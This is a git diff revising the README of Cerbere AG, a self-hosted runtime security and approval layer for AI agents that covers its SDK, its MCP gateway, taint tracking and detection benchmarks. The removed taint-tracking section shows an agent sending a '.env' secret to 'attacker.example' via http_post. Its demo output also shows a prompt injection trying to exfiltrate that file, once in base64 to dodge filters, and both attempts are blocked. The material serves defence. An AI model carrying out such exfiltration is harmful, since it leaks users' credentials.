@@ -1,177 +1,91 @@
-<div align="center">
-
-<img src="docs/logo.png" alt="Cerbere" width="120" />
-
 # Cerbere AG
 
-### Multi-Agent Trust Infrastructure
-
-**What an agent may do, and what agents may do together.**
-
-Cerbere provides the trust layer for autonomous agent systems: identity, authority, runtime enforcement and evidence.
-It helps teams define which agent can act, under whose authority, on which tools and data — and build toward safe, accountable work across multiple agents.
-
-Self-hosted. Framework-independent. Built for MCP and existing agent stacks.
-
-<br/>
-
-![Self-Hosted](https://img.shields.io/badge/Self--Hosted-yes-e8845a?style=flat-square)
-![Open Source](https://img.shields.io/badge/Open%20Source-core-4c9a6a?style=flat-square)
-[![Apache-2.0](https://img.shields.io/badge/Apache--2.0-core-4c9a6a?style=flat-square)](LICENSE)
-![MCP Ready](https://img.shields.io/badge/MCP-Ready-0b0b0c?style=flat-square)
-[![PyPI](https://img.shields.io/pypi/v/cerbere-ag?style=flat-square&color=e8845a&label=pypi)](https://pypi.org/project/cerbere-ag/)
-[![Tests](https://img.shields.io/github/actions/workflow/status/chrismsmr-celcom/cerbere-AG/ci.yml?style=flat-square&label=tests)](https://github.com/chrismsmr-celcom/cerbere-AG/actions/workflows/ci.yml)
-
-</div>
-
-```bash
-git clone https://github.com/chrismsmr-celcom/cerbere-AG.git && cd cerbere-AG
-./scripts/selfhost-init.sh        # writes .env with random secrets
-docker compose up -d --build      # collector + dashboard + PostgreSQL + Redis
-```
-
-Dashboard on `http://localhost:8080`. Create your admin account: [Self-hosting](#-self-hosting).
-
 <div align="center">
 
-<img src="docs/demo-10s.gif" alt="Cerbere in 10 seconds: a risky send_email call is held for human approval, then rejected" width="860" />
+<img src="docs/logo.png" alt="Cerbere" width="112" />
 
-*10 seconds: an agent tries to email customer data to a personal address. Cerbere holds the call for approval and the reviewer rejects it.*
+### Runtime security for autonomous AI agents
+
+**Control what your agents can do — before their actions reach your tools, systems and data.**
+
+Cerbere is a self-hosted runtime security and observability layer for autonomous agents. It evaluates tool actions, enforces policies, tracks sensitive data, and records evidence across agent workflows.
+
+We are starting with **coding agents** — where terminal, filesystem, Git and MCP access create a direct operational attack surface — while keeping the same security layer available to business agents, workflow agents and custom agent systems.
+
+[![Apache-2.0](https://img.shields.io/badge/Apache--2.0-core-4c9a6a?style=flat-square)](LICENSE)
+![Self-hosted](https://img.shields.io/badge/Self--hosted-yes-e8845a?style=flat-square)
+![MCP](https://img.shields.io/badge/MCP-supported-0b0b0c?style=flat-square)
+[![PyPI](https://img.shields.io/pypi/v/cerbere-ag?style=flat-square&color=e8845a&label=cerbere-ag)](https://pypi.org/project/cerbere-ag/)
+[![Tests](https://img.shields.io/github/actions/workflow/status/chrismsmr-celcom/cerbere-AG/ci.yml?style=flat-square&label=tests)](https://github.com/chrismsmr-celcom/cerbere-AG/actions/workflows/ci.yml)
+
+[Quick start](#quick-start) · [Coding agents](#coding-agents) · [How it works](#how-it-works) · [Other agents](#beyond-coding-agents) · [Self-hosting](#self-hosting) · [Roadmap](#roadmap)
 
 </div>
 
-<br/>
+---
 
-[Trust model](#the-trust-model) · [What Cerbere controls](#what-cerbere-controls) · [Quick start](#-quick-start) · [Integrations](#-works-with) · [Architecture](#-how-it-works) · [Self-hosting](#-self-hosting) · [Benchmarks](#-detection-honest-numbers) · [License](#-license)
+## Why runtime security
 
-**Open source (Apache-2.0):** the SDK, the MCP server, the collector and the dashboard. Only the `ee/` directory (company SSO, compliance report) is under a separate enterprise license: see [License](#-license).
+An autonomous agent can do more than generate text. It can read source files, run shell commands, modify repositories, call external services, access business data and delegate work.
 
-<br/>
+Prompt filtering alone does not govern those actions. Cerbere focuses on the execution boundary: **what action is being attempted, which agent is attempting it, what data is involved, and whether the action should proceed.**
 
-## The trust model
+Cerbere is not an agent framework or an orchestrator. It does not choose tasks or coordinate work between agents. It governs the security and evidence around the actions agents perform.
 
-AI agents are becoming independent actors inside business systems. They call tools, access sensitive data, delegate work and increasingly operate alongside other agents. Securing one prompt or one tool call is not enough: teams need to know **which agent is acting, what authority it has, where that authority came from, and what happened as a result**.
+## What Cerbere does
 
-Cerbere is being built as the trust infrastructure beneath those systems. It is not an agent framework or task orchestrator. It does not decide what work your agents should do. It governs identity, permissions and evidence around the work they perform.
-
-### What an agent may do
-
-Establish a trustworthy boundary around each agent:
-
-- **Identity:** distinguish registered machine identities from human users.
-- **Authority:** apply organization and agent-level access rules instead of trusting a caller-supplied agent name.
-- **Runtime enforcement:** inspect tool calls and allow, block or require human approval before execution.
-- **Data boundaries:** track sensitive information and prevent unsafe outbound use.
-- **Evidence:** record decisions and execution traces so actions can be investigated.
-
-### What agents may do together
-
-When agents work together, trust must extend across the relationship — not stop at each agent's individual API key. Cerbere's target model is explicit, limited and attributable authority between agents:
-
-- **Delegation:** an agent can pass only the authority it actually holds, within narrower scopes.
-- **Boundaries:** delegated authority is tied to a recipient, permitted actions and an expiry.
-- **Revocation:** withdrawing authority must also invalidate dependent delegations.
-- **Lineage:** preserve who delegated what, which agent acted, and which data or decision flowed between them.
-
-These multi-agent delegation capabilities are part of the architecture being built; they are **not yet shipped**. Today, Cerbere provides the existing identity foundation, runtime controls, signed decisions, taint tracking and audit evidence. See the roadmap for the work still ahead.
-
-## What Cerbere controls
-
-| Trust layer | What it means today |
+| Capability | What it does |
 |---|---|
-| **Identity** | Multi-tenant organization identities and registered agent credentials; human and machine roles are separated in the Phase 1 changes. |
-| **Authorization** | Agent-level policies, tool allowlists, budgets and signed runtime decisions. |
-| **Enforcement** | SDK guards and an MCP gateway that can block or hold tool calls before execution. |
-| **Data protection** | Taint tracking for secrets and PII across guarded tool flows. |
-| **Evidence** | Traces, risk decisions and hash-chained audit records with signed checkpoints. |
+| **Runtime enforcement** | Evaluates tool calls before execution; allows, blocks or routes risky actions for human approval. |
+| **Identity and authorization** | Associates activity with registered agent identities and applies agent-level policies and tool allowlists. |
+| **Data protection** | Detects PII and secrets, tracks sensitive data through guarded flows, and blocks unsafe outbound use. |
+| **Observability** | Captures model and tool spans, latency, token usage, cost and security decisions. |
+| **Audit evidence** | Records security events in a hash-chained audit trail with signed checkpoints and action-bound signed decisions. |
+| **Self-hosting** | Runs the collector, dashboard and policy infrastructure on your own environment. |
 
-The governing principle is simple: **an agent must not gain authority just because another agent called it.** Cross-agent authority needs an explicit, verifiable delegation model.
+Cerbere is defense in depth, not a guarantee that every attack will be detected. It should complement — not replace — operating-system isolation, least-privilege credentials, network controls and code review.
 
-<br/>
+## Coding agents
 
-## 🚀 Quick start
+Coding agents are our first focused integration surface because their tools can change real systems: source files, shell environments, repositories, credentials and deployment workflows.
 
-### 1. Run Cerbere
+### Current integration status
 
-See the three commands at the top of this page, then create your first admin:
-
-```bash
-docker compose exec collector python -m collector.cli create-admin --email you@company.com
-```
-
-Open `http://localhost:8080/login`, then create an API key in the dashboard.
-
-### 2. Guard your agent (Python)
-
-```bash
-pip install cerbere-ag
-```
-
-```python
-from agentguard import AgentGuard  # the Python module keeps its historical name
-
-guard = AgentGuard(
-    collector_url="http://localhost:8080",
-    api_key="ag-your-key",
-    agent_id="my-agent",
-)
-
-
-@guard.guard_tool_call("send_email")
-def send_email(to, subject, body):
-    return email_service.send(to, subject, body)
-
-
-@guard.guard_llm_call
-def call_openai(messages):
-    return client.chat.completions.create(model="gpt-4o", messages=messages)
-```
-
-If a call is denied, a `SecurityException` is raised before the tool runs. If it needs approval, it waits in the dashboard queue.
-
-### 3. Or use MCP (no code changes)
-
-See [Works with](#-works-with) for Claude Code and Cursor.
-
-<details>
-<summary><b>Optional SDK extras</b></summary>
-<br/>
-
-| Extra | Adds |
-|---|---|
-| `cerbere-ag[signing]` | Ed25519 verification of signed server decisions. **Opt-in**: set `AGENTGUARD_PUBLIC_KEY` (or pass `public_key_pem=`); without a key the SDK does not request signed decisions |
-| `cerbere-ag[pii]` | Advanced PII detection via Presidio |
-| `cerbere-ag[redis]` | Distributed rate limiting and LLM-judge cache |
-| `cerbere-ag[ml]` | Local ML classifier (torch + transformers) |
-
-</details>
-
-<br/>
-
-## 🔗 Works with
-
-| Framework / client | How it connects | Start here |
+| Agent / surface | Connection today | Status |
 |---|---|---|
-| **MCP** | MCP server (agent checks its own calls) or MCP gateway (proxy that enforces in front of any MCP server) | [`mcp/README.md`](mcp/README.md) · [`README_MCP.md`](README_MCP.md) |
-| **LangChain / LangGraph** | `guard_llm_call` around the model call | [`examples/langchain_example.py`](examples/langchain_example.py) |
-| **CrewAI** | `guard_tool_call` around each tool, tool allowlist as policy | [`examples/crewai_example.py`](examples/crewai_example.py) (follows the documented CrewAI API, not run in CI) |
-| **Claude Code** | MCP | snippet below |
-| **Cursor** | MCP | snippet below |
-| **OpenAI, Anthropic, DeepSeek SDKs** | Decorators around your call | [`examples/example_agent.py`](examples/example_agent.py) |
+| Claude Code | Connect through Cerbere's MCP server or place the MCP gateway in front of MCP tools | Available through MCP |
+| Cursor | Connect through Cerbere's MCP server or gateway | Available through MCP |
+| Other MCP-compatible coding agents | Use the MCP server or gateway where the client supports MCP | Available, client-dependent |
+| Native lifecycle hooks | Agent-specific hooks for command, file, prompt and tool-result events | In development |
 
-Cerbere sits at the execution boundary, so the underlying model does not need to change.
+**Important distinction:** MCP integration does not automatically intercept every native action an agent can perform. For example, connecting an MCP server does not by itself mediate a coding agent's direct shell or filesystem operations. Native hooks and other enforcement adapters are needed for those surfaces. We will document each agent's actual event coverage as it is implemented and tested.
 
-**Claude Code**
+### What we are building toward
+
+- Inspect commands and tool arguments before execution.
+- Apply identity-aware permissions and explicit tool allowlists.
+- Detect prompt injection and sensitive-data exposure.
+- Inspect tool results for secrets and untrusted instructions before they return to the agent.
+- Require human approval for high-impact or irreversible actions.
+- Keep an attributable record of decisions, execution results and policy changes.
+
+### Connect through MCP today
+
+Cerbere ships an MCP server and a gateway. The server exposes security utilities an agent can call. The gateway is the enforcement component: it sits between an MCP client and upstream MCP servers and evaluates tool calls before forwarding them.
+
+See the [MCP package guide](mcp/README.md) for installation, configuration and transport options.
+
+For Claude Code, a local MCP server can be added with:
 
 ```bash
-pip install ./mcp     # from the cloned repo
+pip install cerbere-ag-mcp
 claude mcp add cerbereag \
   -e AGENTGUARD_MCP_COLLECTOR_URL=http://localhost:8080 \
   -e AGENTGUARD_API_KEY=ag-your-key \
   -- cerbere-ag-mcp
 ```
 
-**Cursor**: add to `.cursor/mcp.json`
+For Cursor, add the server to `.cursor/mcp.json`:
 
 ```json
 {
@@ -181,269 +95,172 @@ claude mcp add cerbereag \
       "env": {
         "AGENTGUARD_MCP_COLLECTOR_URL": "http://localhost:8080",
         "AGENTGUARD_API_KEY": "ag-your-key",
-        "AGENTGUARD_AGENT_ID": "my-agent"
+        "AGENTGUARD_AGENT_ID": "my-coding-agent"
       }
     }
   }
 }
 ```
 
-> **Advisory server vs enforcing gateway.** The MCP *server* exposes tools such as `check_prompt_security` and `authorize_tool_call`: the agent chooses to call them. To *enforce* checks on every call to an existing MCP server, put the MCP *gateway* in front of it (see [`mcp/README.md`](mcp/README.md)).
+For enforcement on calls to existing MCP servers, use the gateway rather than relying on the advisory server alone. Follow the [gateway configuration guide](mcp/README.md#the-universal-mcp-gateway).
 
-<br/>
+## Quick start
 
-## 🧭 Runtime enforcement architecture
-
-<p align="center">
-  <img src="docs/architecture.svg" alt="Cerbere architecture: agent, integration points, runtime engine, decision, tools, collector and dashboard" width="100%" />
-</p>
-
-Three detection layers run in order of cost, so most clean traffic never pays for the deeper ones:
-
-1. **Rules and policy** (under 1 ms): regex patterns in five languages, tool allowlists, budgets.
-2. **Local ML classifier** (optional): prompt-injection model that runs on your CPU.
-3. **LLM judge** (optional): arbitrates only what the ML flagged. Point it at your own model server to stay fully on-site.
-
-<table>
-<tr>
-<td width="33%" valign="top">
-
-### 🛡️ Protect
-Block what should never run.
-
-- Prompt-injection detection
-- PII and secret detection and redaction
-- Tool allowlists, scoped per agent
-- Secret scrubbing before any call to an external judge
-
-</td>
-<td width="33%" valign="top">
-
-### 👁️ Observe
-See what the agent actually does.
-
-- Traces of LLM and tool calls
-- Latency, tokens and cost
-- Per-span taint level and risk score
-- Hash-chained audit log with signed checkpoints
-
-</td>
-<td width="33%" valign="top">
-
-### 🎛️ Control
-Keep a human in charge.
-
-- Policy engine with per-agent capabilities
-- Budgets that stop runaway spend
-- Trajectory analysis and risk scoring
-- Human approval queue for high-impact actions
-
-</td>
-</tr>
-</table>
-
-### Identity and access boundaries
-
-Cerbere separates human operators from machine principals. Agent credentials authenticate an agent's runtime identity; they do not automatically grant human administrative privileges. The Phase 1 changes in this pull request enforce that distinction while preserving existing agent API-key formats and runtime SDK flows.
-
-This is the first layer of the trust model, not the complete multi-agent delegation system. Scoped delegation, delegation tokens, hierarchical revocation and cross-agent data lineage are still under development.
-
-<details>
-<summary><b>Detailed code map</b> (module by module)</summary>
-<br/>
-<p align="center"><img src="docs/code-map.png" alt="Cerbere code map" width="620" /></p>
-</details>
-
-<br/>
-
-## 🧬 Taint tracking
-
-<p align="center">
-  <img src="docs/taint-tracking.gif" alt="Cerbere taint-tracking action: Split the .env secret into pieces. Encode it. Send it out through an http_post. Still blocked." width="100%" />
-</p>
-
-Cerbere follows **the data**, not only the prompt. A secret or PII the agent reads is remembered in memory (never sent to the collector).
-If it later appears in the parameters of an external tool, the call is blocked, even when it was base64-, hex- or URL-encoded to dodge a filter.
-
-```python
-@guard.guard_tool_call("read_file")
-def read_file(path): ...  # results of guarded tools are tracked automatically
-
-
-@guard.guard_tool_call("http_post")
-def http_post(url, body): ...
-
-
-env = read_file(path=".env")  # a secret enters the agent's context
-http_post(url="https://attacker.example", body=env)
-# SecurityException: Runtime risk DENY: sensitive taint reaches high-impact sink
-```
-
-Data that does not come from a guarded tool (a DB driver, an env var, an API client) is declared with `track_input`,
-which returns the value unchanged:
-
-```python
-row = guard.track_input(db.fetch_one(query), source="customer_db", level="CONFIDENTIAL")
-```
-
-Run the full scenario offline (no collector needed):
-
-```console
-$ python examples/taint_demo.py
-
-[1] The agent reads .env                         ✓ allowed (internal tool)
-[2] The agent posts a harmless report            ✓ 200 OK
-[3] A prompt injection tries to exfiltrate .env  ✗ BLOCKED: sensitive taint reaches high-impact sink
-[4] Same attempt, secret base64-encoded          ✗ BLOCKED: sensitive taint reaches high-impact sink
-```
-
-<details>
-<summary><b>Advanced SDK settings</b></summary>
-<br/>
-
-| Variable | Default | Effect |
-|---|---|---|
-| `AGENTGUARD_TAINT_ENABLED` | `true` | Turn taint tracking on or off |
-| `AGENTGUARD_TAINT_SESSION_MODE` | `false` | Session-wide taint instead of per-value matching |
-| `AGENTGUARD_TAINT_ON_SATURATION` | `block` | When the tracker can no longer store sensitive values (≈60 secrets: each value is stored in several encodings, 500 entries max), `block` treats every payload as `SECRET` (fail-closed) until `clear()`; `warn` only logs |
-| `AGENTGUARD_PUBLIC_KEY` / `_FILE` | – | Collector Ed25519 public key; enables verified, action-bound signed decisions in the SDK |
-| `AGENTGUARD_AUDIT_ON_FAILURE` | `degrade` | If an audit event cannot be persisted anywhere: `degrade` sets `AUDIT_DEGRADED` (visible via `status()`), `block` raises |
-| `AGENTGUARD_AUDIT_ANCHOR_FILE` / `_URL` | – | Independent sinks for the audit chain anchor; without one, the anchor only goes to the application log |
-| `AGENTGUARD_STATUS_MAX_AGE` | `300` | Kill switch: if the collector status cannot be refreshed for this many seconds, the agent stops (`AgentStatusStaleException`). `0` disables the check |
-| `AGENTGUARD_FAIL_OPEN` | `false` | `true` (or `fail_open=True`) lets the agent keep running when the collector is unreachable |
-| `AGENTGUARD_APPROVAL_REUSE_TTL` | `0` | Approvals are single-use (consumed atomically by the collector, bound to org, agent, tool and exact arguments). A value > 0 re-enables a reuse window (not recommended) |
-| `AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL` | `false` | Also block outbound HTTP carrying `CONFIDENTIAL` data (PII); `SECRET`, `UNTRUSTED` and `MALICIOUS` are always blocked |
-
-</details>
-
-<br/>
-
-## 🚨 Threat coverage
-
-| Threat | Rules | ML | LLM judge | Taint | Action |
-|---|:---:|:---:|:---:|:---:|---|
-| Prompt injection | ✅ | ✅ | ✅ | | Block |
-| PII leakage | ✅ | ✅ | ✅ | ✅ | Redact / block |
-| Data exfiltration to an external tool | | | | ✅ | Block |
-| Tool misuse | ✅ | ✅ | ✅ | | Block / require approval |
-| Unauthorized tools | ✅ | | | | Block |
-| Budget overflow | ✅ | | | | Block |
-| Ambiguous behavior | | ⚠️ | ✅ | | Review |
-
-Cerbere is defense in depth, not a guarantee that every attack will be detected.
-
-<br/>
-
-## 📏 Detection: honest numbers
-
-Measured on `benchmarks/corpus_2k`, an **internal** corpus of 2,003 prompts: 1,000 attacks (7 categories), 703 benign prompts and 300 hard negatives (legitimate security requests: training material, detection tests). Version v5.5, SDK 0.6.1, CPU only. Method in [`benchmarks/METHODOLOGY.md`](benchmarks/METHODOLOGY.md), full report in [`docs/BENCHMARK.md`](docs/BENCHMARK.md).
-
-| Pipeline | Recall | FP (benign) | FP (hard negatives) | p50 | p99 |
-| --- | --- | --- | --- | --- | --- |
-| Rules / regex | 70.1% | 0% | 0% | 0.87 ms | 6.4 ms |
-| Rules + ML (DeBERTa, local) | 100% | 2.28% | 1.33% | 251 ms | 773 ms |
-| Rules + ML + LLM arbiter | **100%** (1000/1000) | **0%** (0/703) | **0%** (0/300) | 362 ms | 3,144 ms |
-
-95% confidence intervals for the full pipeline: recall [99.62%, 100%], FP benign [0%, 0.54%], FP hard negatives [0%, 1.26%].
-
-- Attacks caught by the rules answer in about 0.55 ms. The ML layer sees only what the rules let through, and the LLM arbiter sees only what the ML flagged.
-- Full-pipeline p95 is 2,716 ms: flagged requests wait for the arbiter. If the arbiter is unreachable, Cerbere falls back to rules + ML, fails closed, and false positives on benign traffic return to about 2.3%.
-- int8 quantization is off by default: it halves latency but drops recall to 74.2% on this model.
-- This corpus is ours, and the detection patterns were tuned against it. Results on independent public datasets will be published separately; treat these figures as a regression baseline, not a guarantee.
-
-<br/>
-
-## 🐳 Self-hosting
-
-**Requirements:** Docker 24+ with the Compose plugin, 2 vCPU / 2 GB RAM for the default (rules) setup, more with the local ML model.
-Anything beyond a local evaluation needs a DNS name and an HTTPS reverse proxy.
+### 1. Start Cerbere
 
 ```bash
-./scripts/selfhost-init.sh                 # .env with random secrets (never overwrites an existing .env)
-docker compose up -d --build               # collector + PostgreSQL + Redis
+git clone https://github.com/chrismsmr-celcom/cerbere-AG.git
+cd cerbere-AG
+./scripts/selfhost-init.sh
+docker compose up -d --build
+```
+
+The dashboard is available at `http://localhost:8080`.
+
+Create the first administrator:
+
+```bash
 docker compose exec collector python -m collector.cli create-admin --email you@company.com
-curl http://localhost:8080/healthz         # health check
 ```
 
-No email server and no external identity provider are needed. Company SSO (OIDC: Okta, Entra ID, Google Workspace, Keycloak, Auth0) can be added later.
+Open `http://localhost:8080/login`, sign in and create an agent API key.
 
-### Your data stays on your infra
-
-Cerbere makes **no outbound calls by default**. Data leaves your network only if you configure it to:
-
-- **LLM judge** (off by default): flagged content goes to `AGENTGUARD_JUDGE_URL`. The default value points to a hosted API; for a fully on-site setup, point it to your own server (Ollama, vLLM, a private Azure/OpenAI deployment).
-- **Alerts**: Slack, webhook and email go to the endpoints you set.
-- **OpenTelemetry**: only if `OTEL_EXPORTER_OTLP_ENDPOINT` is set.
-
-### Essential settings
-
-| Variable | Purpose |
-|---|---|
-| `AGENTGUARD_PUBLIC_URL` | URL your users and agents use to reach Cerbere |
-| `AGENTGUARD_COOKIE_SECURE` | Set `true` once you serve over HTTPS |
-| `AGENTGUARD_TRUSTED_PROXIES` | Number of reverse proxies in front of Cerbere (usually `1`) |
-| `AGENTGUARD_USE_ML` | Local ML classifier (default `false`) |
-| `AGENTGUARD_USE_LLM_JUDGE` | LLM judge (default `false`); any OpenAI-compatible endpoint works |
-| `AGENTGUARD_RATE_LIMIT` | Request rate limit (default `120 per minute`) |
-
-Full guide (HTTPS with Caddy/nginx/Traefik, PostgreSQL TLS, SSO, licensing): [`docs/SELF_HOSTING.md`](docs/SELF_HOSTING.md). All variables: [`env.example`](env.example).
-
-Without Docker: `pip install -r requirements.txt && gunicorn wsgi:app --bind 0.0.0.0:8080`.
-
-<br/>
-
-## 🗺️ Roadmap
-
-| Status | Item |
-|---|---|
-| ✅ Shipped | Three-layer detection · taint tracking · runtime risk and trajectory analysis · human approval queue · signed decisions · multi-tenant collector · MCP server and gateway · company SSO (OIDC) · public benchmark |
-| 🔨 Next | HTTP gateway for agents whose code cannot be changed · "Why was this blocked?" view · documentation site |
-| 🔭 Later | OpenTelemetry export · judge router across models · CLI · scoped agent-to-agent delegation · hierarchical revocation · cross-agent data lineage · finer-grained human RBAC |
-
-Roadmap items are subject to change.
-
-<br/>
-
-## 🤝 Contributing
-
-Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md), [GOVERNANCE.md](GOVERNANCE.md) and the [Code of Conduct](CODE_OF_CONDUCT.md), then:
+### 2. Protect a Python agent
 
 ```bash
-git checkout -b feature/my-feature
-pytest -q
+pip install cerbere-ag
 ```
 
-and open a Pull Request. To report a vulnerability, see [SECURITY.md](SECURITY.md) and please do not disclose exploitable details publicly.
+```python
+from agentguard import AgentGuard, SecurityException
 
-<br/>
+guard = AgentGuard(
+    collector_url="http://localhost:8080",
+    api_key="ag-your-key",
+    agent_id="my-agent",
+)
 
-## 📜 License
+@guard.guard_tool_call("send_email")
+def send_email(to, subject, body):
+    return email_service.send(to, subject, body)
 
-Cerbere uses an **open-core** model. Everything is Apache-2.0 except one directory.
+try:
+    send_email(
+        to="customer@example.com",
+        subject="Account update",
+        body="Your request is complete.",
+    )
+except SecurityException as exc:
+    print("Blocked by Cerbere:", exc)
+```
+
+The guarded function is not called when the action is denied. Calls requiring approval are held for review according to the configured policy.
+
+## How it works
+
+<p align="center">
+  <img src="docs/architecture.svg" alt="Cerbere runtime security architecture" width="100%" />
+</p>
+
+A typical guarded tool flow:
+
+1. **Observe the action:** the SDK or gateway captures the agent identity, tool name, arguments and available context.
+2. **Evaluate:** policy and detection layers assess authorization, risk, prompt injection, budgets and sensitive-data flow.
+3. **Decide:** Cerbere returns an allow, deny or approval decision.
+4. **Enforce:** the integration forwards the action only when authorized.
+5. **Record:** spans, decisions and audit evidence are available to operators.
+
+### Detection layers
+
+1. **Rules and policy:** fast checks, tool permissions and budgets.
+2. **Local ML classifier (optional):** prompt-injection classification on your infrastructure.
+3. **LLM judge (optional):** reviews selected ambiguous cases; it can be configured to use a private model endpoint.
+
+The layers run in order of cost. Clean traffic should not need the deeper checks.
+
+### Data-flow protection
+
+Cerbere tracks sensitive values observed through guarded flows. If a secret is later passed to a protected external tool — including common encoded representations — the outbound action can be blocked.
+
+See [taint tracking](docs/TAINT_TRACKING.md) and the [benchmark methodology](benchmarks/METHODOLOGY.md) for implementation details and evaluation limits.
+
+## Beyond coding agents
+
+The same runtime layer applies to agents that operate business systems:
+
+- **Business workflows:** CRM updates, customer support, ticketing and internal operations.
+- **Data and research agents:** database access, retrieval, file handling and external research.
+- **Framework-based agents:** Python agents built with LangChain, LangGraph, CrewAI and other tool-calling frameworks.
+- **MCP-connected agents:** any compatible client that can route tool calls through an MCP server or gateway.
+
+The integration method depends on the agent's execution surface. Python agents can use the SDK; MCP clients can use the server or gateway; other runtimes can send spans through the HTTP API. See [examples](examples/) and [MCP documentation](mcp/README.md).
+
+## Self-hosting
+
+Cerbere is designed for deployment in your own environment.
+
+**Requirements:** Docker 24+ with the Compose plugin. The default rules-based setup starts with approximately 2 vCPU and 2 GB RAM; local ML inference requires additional resources.
+
+```bash
+./scripts/selfhost-init.sh
+docker compose up -d --build
+docker compose exec collector python -m collector.cli create-admin --email you@company.com
+curl http://localhost:8080/healthz
+```
+
+Cerbere makes no outbound calls by default. External calls occur only when you configure features such as an LLM judge, alerts or an OpenTelemetry exporter.
+
+Full instructions: [Self-hosting guide](docs/SELF_HOSTING.md). Environment variables: [env.example](env.example).
+
+## Detection benchmarks
+
+The published README benchmark uses an internal corpus of 2,003 prompts: 1,000 attacks, 703 benign prompts and 300 hard negatives. The figures below are a regression baseline for that corpus, not a guarantee of performance on unseen traffic.
+
+| Pipeline | Recall | False positives (benign) | False positives (hard negatives) | p50 | p99 |
+|---|---:|---:|---:|---:|---:|
+| Rules / regex | 70.1% | 0% | 0% | 0.87 ms | 6.4 ms |
+| Rules + local ML | 100% | 2.28% | 1.33% | 251 ms | 773 ms |
+| Rules + ML + LLM arbiter | 100% (1,000/1,000) | 0% (0/703) | 0% (0/300) | 362 ms | 3,144 ms |
+
+The full pipeline's p95 was 2,716 ms in this evaluation. The LLM arbiter adds latency; if it is unavailable, the pipeline falls back to rules and ML. Independent public-dataset results are not represented by this table.
+
+Full report: [docs/BENCHMARK.md](docs/BENCHMARK.md).
+
+## Roadmap
+
+| Status | Work |
+|---|---|
+| Shipped | Python SDK · runtime policy enforcement · MCP server and gateway · identity foundation · taint tracking · approval queue · signed decisions · multi-tenant collector · dashboard · audit evidence |
+| In progress | Coding-agent integration registry · native lifecycle adapters · agent-specific event normalization and coverage tests |
+| Next | Claude Code native hook adapter · Codex integration · Cursor native integration · tool-result inspection across supported adapters · integration conformance tests |
+| Later | Broader agent coverage · richer agent identity and scoped delegation · cross-agent data lineage · expanded policy simulation and evidence export |
+
+Roadmap items are subject to change. An item is not considered supported until its integration and enforcement behavior are documented and tested.
+
+## Contributing
+
+Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md), [GOVERNANCE.md](GOVERNANCE.md) and the [Code of Conduct](CODE_OF_CONDUCT.md), then open a pull request.
+
+To report a vulnerability, see [SECURITY.md](SECURITY.md). Please do not disclose exploitable details publicly.
+
+## License
+
+Cerbere uses an open-core model.
 
 | Component | Paths | License |
 |---|---|---|
-| Core: SDK, MCP server and gateway, collector, dashboard | everything outside `ee/` | **Apache 2.0**: free for commercial and non-commercial use ([LICENSE](LICENSE)) |
-| Enterprise Edition: company SSO (OIDC), compliance report | `ee/` | Source-available under [ee/LICENSE.md](ee/LICENSE.md): you may read, modify and evaluate it; production use requires a Team or Enterprise subscription |
+| Core SDK, MCP server and gateway, collector, dashboard | Everything outside `ee/` | Apache-2.0 — see [LICENSE](LICENSE) |
+| Enterprise Edition | `ee/` | Source-available under [ee/LICENSE.md](ee/LICENSE.md); production use requires a Team or Enterprise subscription |
 
-The core runs fully without `ee/` and without a license key. Paid plans and how license keys work are described in [docs/LICENSING.md](docs/LICENSING.md).
+The core runs without `ee/` and without a license key. Details: [docs/LICENSING.md](docs/LICENSING.md).
 
-Enterprise plans and commercial questions: **hello@cerbereag.site**
+Security and commercial questions: **hello@cerbereag.site**
 
-If you reference Cerbere in research or documentation, please credit *Cerbere / AgentGuard, created by Christopher Dikesa*.
-
-<br/>
-
-## ⚠️ Security disclaimer
-
-Cerbere reduces risk in AI agent systems. It does not guarantee protection against prompt injection, data leakage, tool abuse or model vulnerabilities.
-Do not rely on it as the sole security control for critical infrastructure.
-
-<br/>
+---
 
 <div align="center">
 
-**Identity. Authority. Evidence.**
+**Runtime security for autonomous agents.**
 
 Copyright © 2026 Christopher Dikesa
 
